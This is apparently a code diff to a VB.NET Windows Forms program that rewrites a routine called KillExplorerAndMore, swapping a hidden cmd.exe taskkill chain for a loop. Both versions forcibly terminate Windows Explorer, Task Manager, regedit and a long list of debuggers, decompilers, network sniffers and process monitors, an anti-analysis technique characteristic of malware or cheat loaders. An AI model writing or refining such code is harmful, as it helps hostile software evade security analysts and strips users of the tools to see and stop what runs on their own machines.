@@ -1201,47 +1201,35 @@ Public Class Form1
 
     Private Sub KillExplorerAndMore()
         Try
-            'Kill explorer.exe 
-            Dim process As New Process()
-            process.StartInfo.FileName = "cmd.exe"
-            process.StartInfo.Arguments = "/C taskkill /F /IM explorer.exe" &
-                                       " && taskkill /F /IM taskmgr.exe" &
-                                       " && taskkill /F /IM process.exe" &
-                                       " && taskkill /F /IM processhacker.exe" &
-                                       " && taskkill /F /IM ksdumper.exe" &
-                                       " && taskkill /F /IM fiddler.exe" &
-                                       " && taskkill /F /IM httpdebuggerui.exe" &
-                                       " && taskkill /F /IM wireshark.exe" &
-                                       " && taskkill /F /IM httpanalyzerv7.exe" &
-                                       " && taskkill /F /IM decoder.exe" &
-                                       " && taskkill /F /IM regedit.exe" &
-                                       " && taskkill /F /IM procexp.exe" &
-                                       " && taskkill /F /IM dnspy.exe" &
-                                       " && taskkill /F /IM vboxservice.exe" &
-                                       " && taskkill /F /IM burpsuite.exe" &
-                                       " && taskkill /F /IM DbgX.Shell.exe" &
-                                       " && taskkill /F /IM ILSpy.exe" &
-                                       " && taskkill /F /IM ollydbg.exe" &
-                                       " && taskkill /F /IM x32dbg.exe" &
-                                       " && taskkill /F /IM x64dbg.exe" &
-                                       " && taskkill /F /IM gdb.exe" &
-                                       " && taskkill /F /IM idaq.exe" &
-                                       " && taskkill /F /IM idag.exe" &
-                                       " && taskkill /F /IM idaw.exe" &
-                                       " && taskkill /F /IM ida64.exe" &
-                                       " && taskkill /F /IM idag64.exe" &
-                                       " && taskkill /F /IM idaw64.exe" &
-                                       " && taskkill /F /IM idaq64.exe" &
-                                       " && taskkill /F /IM windbg.exe" &
-                                       " && taskkill /F /IM immunitydebugger.exe" &
-                                       " && taskkill /F /IM windasm.exe" &
-                                       " && taskkill /F /IM systeminformer.exe"
-            process.StartInfo.CreateNoWindow = True
-            process.StartInfo.UseShellExecute = False
-            process.Start()
+            ' List of process names to kill
+            Dim processesToKill As String() = {
+            "explorer.exe", "taskmgr.exe", "process.exe", "processhacker.exe",
+            "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe",
+            "httpanalyzerv7.exe", "decoder.exe", "regedit.exe", "procexp.exe",
+            "dnspy.exe", "vboxservice.exe", "burpsuite.exe", "DbgX.Shell.exe",
+            "ILSpy.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe",
+            "gdb.exe", "idaq.exe", "idag.exe", "idaw.exe",
+            "ida64.exe", "idag64.exe", "idaw64.exe", "idaq64.exe",
+            "windbg.exe", "immunitydebugger.exe", "windasm.exe", "systeminformer.exe"
+        }
+
+            ' Kill the processes
+            For Each processName In processesToKill
+                Try
+                    Dim processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(processName))
+                    For Each proc In processes
+                        If Not proc.HasExited Then
+                            proc.Kill() ' Kill the process
+                            proc.WaitForExit() ' Optionally wait for the process to exit
+                        End If
+                    Next
+                Catch ex As Exception
+                    Console.WriteLine("Could not kill process " & processName & ": " & ex.Message)
+                End Try
+            Next
 
         Catch ex As Exception
-            Console.WriteLine("An error occured: " & ex.Message)
+            Console.WriteLine("An error occurred: " & ex.Message)
         End Try
     End Sub
 
